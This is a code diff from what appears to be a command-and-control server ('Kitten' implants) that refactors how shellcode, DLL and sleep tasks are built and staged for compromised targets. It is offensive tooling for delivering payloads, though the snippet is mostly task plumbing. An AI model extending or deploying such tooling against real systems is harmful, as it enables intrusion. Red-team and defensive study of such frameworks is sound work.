@@ -16,7 +16,7 @@ var Targets map[string]*Kitten
 
 // HostShellcode Hosts the shellcode
 func HostShellcode(path string, kittenName string) error {
-	var task *util.Task
+	task := util.NewTask()
 	var err error
 	key := Targets[kittenName].GetKey()
 	sc, err := os.ReadFile(path)
@@ -26,11 +26,13 @@ func HostShellcode(path string, kittenName string) error {
 	contentType := http.DetectContentType(sc)
 	//checks if the file is a hex file
 	if contentType == "text/plain; charset=utf-8" {
-		util.NewTask("shellcode", sc)
+		task.SetTag("shellcode")
+		task.SetPayload(sc)
 		// check if the file is a binary
 	} else if contentType == "application/octet-stream" {
 		hexstring := fmt.Sprintf("%x ", sc)
-		util.NewTask("shellcode", []byte(hexstring))
+		task.SetTag("shellcode")
+		task.SetPayload([]byte(hexstring))
 	}
 	payload, err := json.Marshal(task)
 	if err != nil {
@@ -48,7 +50,9 @@ func HostShellcode(path string, kittenName string) error {
 // HostSleep Hosts the sleep time the same way as the shellcode
 func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
-	task := util.NewTask("sleep", []byte(fmt.Sprintf("%d", t)))
+	task := util.NewTask()
+	task.SetTag("sleep")
+	task.SetPayload([]byte(fmt.Sprintf("%d", t)))
 	key := Targets[kittenName].GetKey()
 	payload, err := json.Marshal(task)
 	if err != nil {
@@ -76,7 +80,9 @@ func HostDll(path, entry, kittenName string) error {
 		return err
 	}
 	hexstring := fmt.Sprintf("%x ", sc)
-	task := util.NewTask("shellcode", []byte(hexstring))
+	task := util.NewTask()
+	task.SetTag("shellcode")
+	task.SetPayload([]byte(hexstring))
 	payload, err := json.Marshal(task)
 	if err != nil {
 		return err
